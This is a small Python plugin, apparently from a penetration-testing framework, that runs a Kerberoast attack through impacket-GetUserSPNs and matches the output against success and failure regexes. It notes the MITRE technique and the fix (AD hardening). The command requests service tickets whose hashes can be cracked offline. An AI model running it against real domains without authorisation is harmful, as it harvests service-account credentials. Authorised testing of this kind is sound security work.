"""Kerberoast via impacket-GetUserSPNs. Fix = AD hardening (NOT SD-WAN)."""
META = {
    "id": "kerberoast",
    "name": "Kerberoast",
    "category": "AD Exploitation",
    "test_type": "pentest",
    "added": True,  # opt-in, not in the original baseline set
    "control": "AD hardening (NOT SD-WAN)",
    "fix": "Server",
    "mitre": ['T1558.003'],
    "cwe": ['CWE-522'],
    "tactic": 'Credential Access',
    "requires": ["impacket-GetUserSPNs"],
    "ports": [("tcp", 88), ("tcp", 389)],
    "success_regex": r"\$krb5tgs\$|ServicePrincipalName|MSSQL/",
    "blocked_regex": r"timed out|Connection refused|unreachable|Errno",
}

def run(target, ctx):
    return ctx.run_cmd(
        "impacket-GetUserSPNs {domain}/{dc_user}:{dc_pass} -dc-ip {target} -request",
        target)
